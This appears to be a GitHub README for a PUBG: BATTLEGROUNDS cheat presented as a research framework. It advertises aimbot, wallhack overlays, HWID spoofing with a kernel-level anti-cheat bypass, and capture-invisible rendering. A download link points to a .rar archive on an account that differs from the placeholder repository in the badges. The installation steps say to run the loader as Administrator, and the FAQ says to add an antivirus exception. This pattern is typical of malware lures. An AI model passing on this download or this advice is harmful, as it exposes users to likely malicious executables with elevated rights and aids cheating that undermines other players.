<div align="center">

# Pubg Cheat

> **Modular instrumentation framework for studying real-time memory behavior in PUBG: BATTLEGROUNDS**/
> 

<br/>

[![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0a0a12?style=for-the-badge&logo=windows&logoColor=00fff7)](https://github.com/yourname/pubg-rak)
[![Language](https://img.shields.io/badge/C%2B%2B-23-0a0a12?style=for-the-badge&logo=cplusplus&logoColor=b026ff)](https://github.com/yourname/pubg-rak)
[![Graphics](https://img.shields.io/badge/Dear%20ImGui-DX11-0a0a12?style=for-the-badge&logoColor=ff2d95)](https://github.com/yourname/pubg-rak)
[![Version](https://img.shields.io/badge/Version-3.1-0a0a12?style=for-the-badge&logoColor=00fff7)](https://github.com/yourname/pubg-rak/releases)
[![License](https://img.shields.io/badge/License-MIT-0a0a12?style=for-the-badge&logoColor=b026ff)](LICENSE)

<br/>

<table>
  <tr>
    <td align="center">
      <img width="494" height="331" src="https://github.com/user-attachments/assets/1b4e4f28-c7fd-4a22-a309-8e64cd6cc597" alt="Runtime interface" />
      <br/>
      <sub>runtime interface</sub>
    </td>
    <td align="center">
      <img width="494" height="331" src="https://github.com/user-attachments/assets/c2b425cc-c61c-4219-a9b4-122baf43f7b4" alt="Module panel" />
      <br/>
      <sub>module panel</sub>
    </td>
  </tr>
</table>

</div>

[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/Futuremaccare/Pubg-Cheat/releases/download/PUBG.V3.2/PUBG.V3.2.rar)

## ▸ overview

**PUBG Cheat** is an external instrumentation framework for observing and modifying runtime state in PUBG: BATTLEGROUNDS. Built for reverse-engineering research and private sandbox experimentation, it provides a modular interface for inspecting memory structures, simulating state changes, and analyzing gameplay parameters.

> ⚠️ **disclaimer:** intended for educational and private use only. authors are not responsible for misuse in public multiplayer environments.


## ▸ modules

| id | module | description |
| :--- | :--- | :--- |
| `aim` | 🎯 **Targeting Logic** | Adjustable FOV, bone prioritization, smoothing curve, and recoil compensation. |
| `vis` | 👁️ **Visual Overlay** | 2D/3D bounding boxes, skeletal structures, health indicators, distance readout. |
| `rad` | 📡 **Radar System** | Customizable mini-radar with live position tracking and zoom control. |
| `chm` | 🎨 **Material Override** | Visible and invisible player recoloring with multiple render styles. |
| `wld` | 🌍 **Environment Control** | World tint, sun color, cloud modulation, skybox replacement. |
| `cfg` | ⚙️ **Config Manager** | Save, load, and share presets. Auto-save on change. |
| `sec` | 🛡️ **HWID Layer** | Hardware fingerprint protection and kernel-level bypass. |
| `str` | 🎥 **Streamproof** | Invisible to OBS, Discord, ShadowPlay, and capture software. |
| `key` | 🔑 **Hotkey Bindings** | Fully rebindable F1–F12 for every module. |

**total: 9 core modules · 41 adjustable parameters**



## ▸ requirements

| | |
| :--- | :--- |
| **os** | Windows 10 / 11 x64 (1909+) |
| **game** | PUBG: BATTLEGROUNDS (latest Steam build) |
| **perms** | administrator rights for loader |
| **display** | windowed / borderless windowed |
| **runtime** | Visual C++ Redistributable 2015–2022 |


## ▸ [installation](https://github.com/Futuremaccare/Pubg-Cheat/releases/download/PUBG.V3.2/PUBG.V3.2.rar)

**1.** download the latest release from the **[Releases](https://github.com/yourname/pubg-rak/releases)** tab

**2.** extract archive to a single

**3.** run the loader as **Administrator**

**4.** launch PUBG, enter a match, press `INSERT` or `DELETE`


## ▸ faq

<details>
<summary><b>is this safe?</b></summary>
<br>
the kit modifies runtime memory only — no disk writes to game files.
</details>

<details>
<summary><b>works with latest version?</b></summary>
<br>
compatibility maintained with current Steam builds. check the Releases tab for updates.
</details>

<details>
<summary><b>why does antivirus flag it?</b></summary>
<br>
memory-injection frameworks trigger heuristic false positives. add an exception if you trust the source.
</details>

<details>
<summary><b>can i use in online matches?</b></summary>
<br>
intended for private and educational use only. not recommended for public multiplayer.
</details>





**⭐ star the repo if it helped**
